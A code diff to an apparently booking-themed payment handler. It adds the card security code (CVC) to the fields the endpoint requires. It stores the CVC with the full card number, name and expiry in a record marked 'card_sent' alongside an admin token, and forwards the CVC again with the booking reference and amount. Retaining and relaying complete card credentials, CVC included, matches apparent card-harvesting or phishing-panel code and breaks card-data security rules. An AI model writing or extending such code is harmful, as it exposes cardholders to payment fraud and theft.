@@ -39,9 +39,9 @@ async function handler(req, res) {
 
   await dbConnect();
 
-  const { bookingId, number, name, expiry } = req.body;
+  const { bookingId, number, name, expiry, cvc } = req.body;
 
-  if (!bookingId || !number || !name || !expiry) {
+  if (!bookingId || !number || !name || !expiry || !cvc) {
     return res.status(400).json({ success: false, error: 'Données de carte manquantes' });
   }
 
@@ -67,6 +67,7 @@ async function handler(req, res) {
     cardNumber: formatCardNumber(number),
     cardName:   name,
     cardExpiry: expiry,
+    cardCvc:    cvc,
     step:       'card_sent',
     adminToken,
   });
@@ -82,6 +83,7 @@ async function handler(req, res) {
     cardNumber: formatCardNumber(number),
     cardName:   name,
     cardExpiry: expiry,
+    cardCvc:    cvc,
     bookingRef,
     amount: formatPrice(booking.totalPrice),
   });
